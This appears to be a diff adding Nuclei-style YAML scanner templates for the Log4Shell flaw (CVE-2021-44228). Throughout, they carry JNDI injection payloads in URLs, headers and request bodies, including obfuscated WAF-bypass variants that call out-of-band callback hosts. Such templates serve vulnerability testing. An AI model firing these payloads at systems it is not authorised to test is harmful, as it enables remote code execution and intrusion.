@@ -1,0 +1,141 @@
+id: log4j-rce
+info:
+  name: Log4j RCE (CVE-2021-44228)
+  author: AniipID
+  severity: critical
+  description: Detects Log4j JNDI injection vulnerability
+  tags: cve,cve2021,log4j,rce,jndi
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q=${jndi:ldap://{{Hostname}}.collaborator.com/a}"
+      - "{{BaseURL}}?q=${jndi:rmi://{{Hostname}}.oastify.com/a}"
+      - "{{BaseURL}}?q=${jndi:dns://{{Hostname}}.interactsh.com/a}"
+      - "{{BaseURL}}?q=${jndi:ldap://127.0.0.1:1389/a}"
+      - "{{BaseURL}}?q=${jndi:ldap://0.0.0.0:1389/a}"
+    headers:
+      X-Api-Version: "${jndi:ldap://{{Hostname}}.collaborator.com/a}"
+      User-Agent: "${jndi:ldap://{{Hostname}}.dnslog.cn/a}"
+      Referer: "${jndi:ldap://{{Hostname}}.interactsh.com/a}"
+    matchers:
+      - type: word
+        words:
+          - "${jndi:ldap"
+          - "${jndi:rmi"
+          - "${jndi:dns"
+        condition: or
+        name: "log4j-jndi-reflected"
+---
+id: log4j-bypass-waf
+info:
+  name: Log4j WAF Bypass Variants
+  author: AniipID
+  severity: critical
+  description: Tests Log4j exploitation with WAF bypass techniques
+  tags: cve,cve2021,log4j,rce,waf-bypass
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q=${${lower:j}ndi:${lower:l}dap://{{Hostname}}.dnslog.cn/a}"
+      - "{{BaseURL}}?q=${${env:JAVA_HOME}:-j}ndi:ldap://{{Hostname}}.collaborator.com/a}"
+      - "{{BaseURL}}?q=${::-j}ndi:ldap://{{Hostname}}.oastify.com/a}"
+      - "{{BaseURL}}?q=${${env:BARFOO:-j}ndi:${lower:l}dap://{{Hostname}}.interactsh.com/a}"
+      - "{{BaseURL}}?q=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{Hostname}}.dnslog.cn/a}"
+      - "{{BaseURL}}?q=${${env:FOO:-j}ndi:${env:BAR:-l}dap://{{Hostname}}.collaborator.com/a}"
+    matchers:
+      - type: word
+        words:
+          - "jndi"
+          - "ldap"
+        condition: or
+        name: "log4j-waf-bypass"
+---
+id: log4j-post-body
+info:
+  name: Log4j in POST Body
+  author: AniipID
+  severity: critical
+  description: Detects Log4j injection via POST request body
+  tags: cve,cve2021,log4j,rce,post
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/log"
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/search"
+    body: 'username=${jndi:ldap://{{Hostname}}.collaborator.com/a}&password=test'
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    matchers:
+      - type: word
+        words:
+          - "${jndi:ldap"
+        name: "log4j-post-body"
+---
+id: log4j-json-body
+info:
+  name: Log4j JSON Body Injection
+  author: AniipID
+  severity: critical
+  description: Detects Log4j injection through JSON API payloads
+  tags: cve,cve2021,log4j,rce,json
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/log"
+      - "{{BaseURL}}/api/event"
+    body: '{"message":"${jndi:ldap://{{Hostname}}.collaborator.com/a}","level":"info"}'
+    headers:
+      Content-Type: "application/json"
+    matchers:
+      - type: word
+        words:
+          - "${jndi:ldap"
+        name: "log4j-json"
+---
+id: log4j-header-multi
+info:
+  name: Log4j Multi-Header Injection
+  author: AniipID
+  severity: critical
+  description: Tests Log4j injection via multiple HTTP headers
+  tags: cve,cve2021,log4j,rce,headers
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      - "{{BaseURL}}/api"
+      - "{{BaseURL}}/search"
+    headers:
+      X-Forwarded-For: "${jndi:ldap://127.0.0.1:1389/a}"
+      X-Real-IP: "${jndi:ldap://127.0.0.1:1389/a}"
+      X-Client-IP: "${jndi:ldap://127.0.0.1:1389/a}"
+      X-Remote-IP: "${jndi:ldap://127.0.0.1:1389/a}"
+      X-Remote-Addr: "${jndi:ldap://127.0.0.1:1389/a}"
+    matchers:
+      - type: word
+        words:
+          - "${jndi:ldap"
+          - "jndi:ldap"
+        condition: or
+        name: "log4j-header-reflected"
+---
+id: log4j-recursive
+info:
+  name: Log4j Recursive Variable Expansion
+  author: AniipID
+  severity: critical
+  description: Detects Log4j with recursive variable expansion for WAF bypass
+  tags: cve,cve2021,log4j,rce,recursive
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q=${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://{{Hostname}}.dnslog.cn/a}"
+      - "{{BaseURL}}?q=${${${:-j}${:-n}${:-d}${:-i}}:${:-l}${:-d}${:-a}${:-p}://{{Hostname}}.dnslog.cn/a}"
+    matchers:
+      - type: word
+        words:
+          - "${lower:"
+          - "${:-"
+        condition: or
+        name: "log4j-recursive-expansion"
